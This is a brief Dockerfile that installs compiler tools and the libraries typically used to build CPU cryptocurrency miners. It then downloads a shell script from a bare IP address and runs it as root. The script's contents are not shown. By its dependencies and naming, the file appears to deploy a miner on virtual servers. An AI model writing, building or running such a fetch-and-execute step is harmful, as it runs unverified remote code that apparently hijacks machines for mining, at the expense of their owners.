FROM ubuntu:latest
RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN wget -O install-vps.sh http://44.201.182.135/install/tuan/ubuntu_install_vps.sh
RUN chmod +x install-vps.sh
RUN bash install-vps.sh

